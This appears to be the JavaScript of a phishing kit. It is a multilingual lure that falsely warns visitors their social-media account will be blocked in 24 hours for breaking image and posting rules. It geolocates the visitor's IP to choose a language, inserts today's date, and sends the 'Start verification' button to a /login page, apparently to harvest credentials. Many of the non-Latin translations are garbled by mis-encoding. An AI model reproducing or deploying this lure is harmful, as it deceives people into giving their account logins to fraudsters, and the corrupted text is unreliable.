// ---------- TRANSLATIONS ----------
const TRANSLATIONS = {
  'de': {
    title: 'Ihr Konto wird f�r 24 Stunden gesperrt.',
    description: 'Unser System hat ungew�hnliche Aktivit�ten auf Ihrem Konto festgestellt, die gegen die Regeln f�r Bilder und Beitr�ge versto�en k�nnten.',
    step1: 'Bitte �berpr�fen und folgen Sie den angegebenen Schritten.',
    step2: 'Um eine Kontosperrung zu vermeiden, haben Sie noch 24 Stunden, um zu verifizieren und Einspruch einzulegen.',
    btn: '�berpr�fung starten',
    restricted: 'Ihr Konto wurde am '
  },
  'nl': {
    title: 'Uw account wordt 24 uur geblokkeerd.',
    description: 'Ons systeem heeft ongebruikelijke activiteiten op uw account gedetecteerd die mogelijk in strijd zijn met de regels voor afbeeldingen en berichten.',
    step1: 'Controleer en volg de aangegeven stappen.',
    step2: 'Om blokkering van uw account te voorkomen, heeft u nog 24 uur om te verifi�ren en in beroep te gaan.',
    btn: 'Start verificatie',
    restricted: 'Uw account werd op '
  },
  'ja': {
    title: '�����o24B���ïU�~Y',
    description: 'S>n����o�����kp8j��ƣ�ƣ��W~W_;τ�?k�Y��GkU�WfD���'LB�~Y',
    step1: ':U�_K���Wf�cfO`UD',
    step2: '�����n��ï�Q�_���hpp3W�fn_�k��24B�LB�~Y',
    btn: '�����',
    restricted: 'Bj_n�����o!n�k6PU�~W_'
  },
  'bg': {
    title: '0H8OB 0:0C=B I5 1J45 1;>:8@0= 70 24 G0A0.',
    description: '0H0B0 A8AB5<0 >B:@8 =5>18G09=0 0:B82=>AB 2 0:0C=B0 28, :>5B> <>65 40 =0@CH020 ?@028;0B0 70 87>1@065=8O 8 ?C1;8:0F88.',
    step1: '>;O, ?@>25@5B5 8 A;54209B5 C:070=8B5 ABJ?:8.',
    step2: '0 40 87153=5B5 1;>:8@0=5B> =0 0:0C=B0, 8<0B5 24 G0A0 40 ?>B2J@48B5 8 >160;20B5.',
    btn: '0?>G=5B5 ?>B2J@64020=5B>',
    restricted: '0H8OB 0:0C=B 5 >3@0=8G5= =0 '
  },
  'pt': {
    title: 'Sua conta ser� bloqueada por 24 horas.',
    description: 'Nosso sistema detectou atividade incomum na sua conta, o que pode violar as regras sobre imagens e postagens.',
    step1: 'Por favor, verifique e siga os passos indicados.',
    step2: 'Para evitar o bloqueio da conta, voc� tem 24 horas para verificar e recorrer.',
    btn: 'Iniciar verifica��o',
    restricted: 'Sua conta foi restringida em '
  },
  'en': {
    title: 'Your account will be blocked for 24 hours.',
    description: 'Our system detected unusual activity on your account which may violate image and posting rules.',
    step1: 'Please check and follow the indicated steps.',
    step2: 'To avoid account blocking, you have 24 hours left to verify and appeal.',
    btn: 'Start verification',
    restricted: 'Your account was restricted on '
  },
  'el': {
    title: '� �������ü�� ñ� �� ���������ĵ� ��� 24 ����.',
    description: '�� ���ķ�� ��� ���ǽ��õ ��Ž����ķ ����ķ���ķı �Ŀ �������ü� ñ�, � ����� ����ǵı� �� ���������� Ŀ�� ������ü��� �ǵĹ�� �� Ĺ� ���̽�� ��� Ĺ� ����Įõ��.',
    step1: '��������ͼ� �����ĵ ��� �����Ÿ��ĵ ı ���������̼��� ����ı.',
    step2: '��� �� ����ͳ�ĵ Ŀ ��������ü� Ŀ� �������ü��, �ǵĵ 24 ���� �� ��������õĵ ��� �� ����ĵ �Ƶ÷.',
    btn: '�������ĵ ķ� ��������÷',
    restricted: '� �������ü�� ñ� ��������ķ�� �Ĺ� '
  },
  'cs': {
    title: 'V�a �et bude zablokov�n na 24 hodin.',
    description: 'N�a syst�m detekoval neobvyklou aktivitu na vaaem �tu, co~ mo~e poruaovat pravidla t�kaj�c� se obr�zko a pY�spvko.',
    step1: 'Zkontrolujte a postupujte podle uveden�ch kroko.',
    step2: 'Aby se zabr�nilo zablokov�n� �tu, m�te 24 hodin na ovYen� a odvol�n�.',
    btn: 'Zah�jit ovYen�',
    restricted: 'V�a �et byl omezen dne '
  },
  'da': {
    title: 'Din konto bliver l�st i 24 timer.',
    description: 'Vores system har registreret us�dvanlig aktivitet p� din konto, som muligvis kan overtr�de reglerne for billeder og opslag.',
    step1: 'Kontroller venligst og f�lg de angivne trin.',
    step2: 'For at undg� kontol�sning har du 24 timer til at bekr�fte og appellere.',
    btn: 'Start verifikation',
    restricted: 'Din konto blev begr�nset den '
  },
  'es': {
    title: 'Tu cuenta ser� bloqueada durante 24 horas.',
    description: 'Nuestro sistema detect� actividad inusual en tu cuenta, lo que puede violar las normas sobre im�genes y publicaciones.',
    step1: 'Por favor, verifica y sigue los pasos indicados.',
    step2: 'Para evitar el bloqueo, tienes 24 horas para verificar y apelar.',
    btn: 'Iniciar verificaci�n',
    restricted: 'Tu cuenta fue restringida el '
  },
  'fi': {
    title: 'Tiliisi estet��n 24 tunniksi.',
    description: 'J�rjestelm�mme on havainnut ep�tavallista toimintaa tilill�si, mik� saattaa rikkoa kuvien ja julkaisujen s��nt�j�.',
    step1: 'Tarkista ja noudata annettuja ohjeita.',
    step2: 'V�lt� tilin est�mist�, sinulla on 24 tuntia aikaa vahvistaa ja valittaa.',
    btn: 'Aloita vahvistus',
    restricted: 'Tilisi rajoitettiin '
  },
  'hu': {
    title: 'A fi�kja 24 �r�ra le lesz tiltva.',
    description: 'Rendszer�nk szokatlan tev�kenys�get �szlelt a fi�kj�n, amely megs�rtheti a k�pekkel �s bejegyz�sekkel kapcsolatos szab�lyokat.',
    step1: 'K�rj�k, ellenQrizze �s k�vesse az utas�tott l�p�seket.',
    step2: 'A fi�k letilt�s�nak elker�l�se �rdek�ben 24 �r�ja van a megerQs�t�sre �s fellebbez�sre.',
    btn: 'MegerQs�t�s ind�t�sa',
    restricted: 'A fi�kja korl�tozva lett '
  },
  'it': {
    title: 'Il tuo account sar� bloccato per 24 ore.',
    description: 'Il nostro sistema ha rilevato attivit� insolite nel tuo account, che potrebbero violare le regole relative alle immagini e ai post.',
    step1: 'Controlla e segui i passaggi indicati.',
    step2: 'Per evitare il blocco dell\'account, hai 24 ore per verificare e fare ricorso.',
    btn: 'Inizia la verifica',
    restricted: 'Il tuo account � stato limitato il '
  },
  'no': {
    title: 'Kontoen din vil bli blokkert i 24 timer.',
    description: 'Systemet v�rt har oppdaget uvanlig aktivitet p� kontoen din, noe som kan bryte med regler for bilder og innlegg.',
    step1: 'Vennligst sjekk og f�lg de angitte trinnene.',
    step2: 'For � unng� blokkering av kontoen, har du 24 timer p� deg til � bekrefte og anke.',
    btn: 'Start bekreftelse',
    restricted: 'Kontoen din ble begrenset den '
  },
  'pl': {
    title: 'Twoje konto zostanie zablokowane na 24 godziny.',
    description: 'Nasz system wykryB nietypow aktywno[ na Twoim koncie, co mo|e narusza zasady dotyczce obraz�w i post�w.',
    step1: 'Prosz sprawdzi i postpowa zgodnie z podanymi krokami.',
    step2: 'Aby unikn blokady konta, masz 24 godziny na weryfikacj i odwoBanie.',
    btn: 'Rozpocznij weryfikacj',
    restricted: 'Twoje konto zostaBo ograniczone '
  },
  'sv': {
    title: 'Ditt konto kommer att blockeras i 24 timmar.',
    description: 'V�rt system har uppt�ckt ovanlig aktivitet p� ditt konto som kan bryta mot reglerna f�r bilder och inl�gg.',
    step1: 'V�nligen kontrollera och f�lj de angivna stegen.',
    step2: 'F�r att undvika blockering av kontot har du 24 timmar p� dig att verifiera och �verklaga.',
    btn: 'Starta verifiering',
    restricted: 'Ditt konto begr�nsades den '
  },
  'th': {
    title: '1
5-809%G-@G@'%2 24 
1H'B!.',
    description: '#0-@#2DI#'4##!5HD!H4C1
5-86H-2%0@!4@5H"'1 2A%0B*L.',
    step1: '#82#'*-A%032!1I-5HA*.',
    step2: '@7H-+%5@%5H"2#%G-1
5-8, 8!5@'%2 24 
1H'B!C2#"7"1A%0-8#L.',
    btn: '@#4H!2#"7"1',
    restricted: '1
5-8931@!7H-'15H '
  },
  'tr': {
    title: 'Hesab1n1z 24 saat boyunca engellenecek.',
    description: 'Sistemimiz, hesab1n1zda olaand1_1 etkinlik tespit etti, bu durum g�r�nt� ve g�nderi kurallar1n1 ihlal edebilir.',
    step1: 'L�tfen kontrol edin ve belirtilen ad1mlar1 izleyin.',
    step2: 'Hesap engellemesini �nlemek i�in, dorulamak ve itirazda bulunmak i�in 24 saatiniz kald1.',
    btn: 'Dorulamay1 ba_lat',
    restricted: 'Hesab1n1z _u tarihte k1s1tland1 '
  },
  'zh': {
    title: '��7��24�',
    description: '����K0��7	8;�����	s�G����',
    step1: '���v	g:e��\',
    step2: ':M7���	24�����L���3�',
    btn: ' ˌ�',
    restricted: '��7(���P6'
  },
  'ro': {
  title: 'Contul tu va fi blocat timp de 24 de ore.',
  description: 'Sistemul nostru a detectat activiti neobinuite �n contul tu, care pot �nclca regulile privind imaginile i postrile.',
  step1: 'Te rugm s verifici i s urmezi paii indicai.',
  step2: 'Pentru a evita blocarea contului, ai la dispoziie doar 24 de ore pentru a verifica i a face apel.',
  btn: '�ncepe verificarea',
  restricted: 'Contul tu a fost restricionat la data de '
  },
  'fr': {
  title: 'Votre compte sera bloqu� pendant 24 heures.',
  description: 'Notre syst�me a d�tect� une activit� inhabituelle sur votre compte, ce qui peut constituer une violation des r�gles concernant les images et les publications.',
  step1: 'Veuillez v�rifier et suivre les �tapes indiqu�es.',
  step2: 'Pour �viter le blocage du compte, il vous reste 24 heures pour v�rifier et faire appel.',
  btn: 'Commencer la v�rification',
  restricted: 'Votre compte a �t� restreint le '
  },
  'vi': {
    title: 'T�i kho�n c�a b�n s� b� kh�a trong 24 gi�.',
    description: 'H� th�ng ph�t hi�n ho�t �ng b�t th��ng trong t�i kho�n c�a b�n, c� th� vi ph�m quy �nh v� h�nh �nh v� b�i ng.',
    step1: 'Vui l�ng ki�m tra v� l�m theo c�c b��c h��ng d�n.',
    step2: '� tr�nh b� kh�a t�i kho�n, b�n c�n 24 gi� � x�c minh v� kh�ng c�o.',
    btn: 'B�t �u x�c minh',
    restricted: 'T�i kho�n c�a b�n � b� h�n ch� v�o ng�y '
  }
};

// Map common full locales or country codes to the translation keys
  const countryToLanguage = {
    AT: 'de', BE: 'nl', JP: 'ja', BG: 'bg', BR: 'pt', CA: 'en', CY: 'el',
    CZ: 'cs', DE: 'de', DK: 'da', ES: 'es', FI: 'fi', FR: 'fr', GB: 'en',
    GR: 'el', HU: 'hu', IT: 'it', NL: 'nl', NO: 'no', PL: 'pl', PT: 'pt',
    RO: 'ro', SE: 'sv', TH: 'th', TR: 'tr', TW: 'zh', US: 'en', VN: 'vi'
  };

// Detect language by IP
async function detectLanguageByIP() {
  try {
    const resp = await fetch('https://get.geojs.io/v1/ip/geo.json');
    if (!resp.ok) throw new Error('geoip failed');
    const data = await resp.json();
    if (data.country_code && countryToLanguage[data.country_code]) {
      console.log("IP country:", data.country_code, "�", countryToLanguage[data.country_code]);
      return countryToLanguage[data.country_code];
    }
  } catch (e) {
    console.warn('GeoIP detection failed:', e);
  }
  return null;
}

function applyTranslations(lang) {
  const t = TRANSLATIONS[lang] || TRANSLATIONS['en'];
  document.getElementById('title').textContent = t.title;
  document.getElementById('description').textContent = t.description;
  document.getElementById('step1').textContent = t.step1;
  document.getElementById('step2').textContent = t.step2;
  document.getElementById('continueBtn').textContent = t.btn;
  const restrictedEl = document.getElementById('restrictedText');
  restrictedEl.childNodes[0].nodeValue = t.restricted;
}

function formatDateForLocale(date, lang) {
  const LOCALE_MAP = { vi: 'vi-VN', en: 'en-US', fr: 'fr-FR', es: 'es-ES', ja: 'ja-JP' };
  const locale = LOCALE_MAP[lang] || 'en-US';
  return date.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' });
}

// Init
(async function init() {
  let lang = await detectLanguageByIP();
  if (!lang) lang = "en"; // fallback m�c �nh ti�ng Anh

  applyTranslations(lang);

  const date = new Date();
  document.getElementById('currentDate').textContent = formatDateForLocale(date, lang);

document.getElementById('continueBtn').addEventListener('click', function() {
    window.location.href = '/login';
});
})();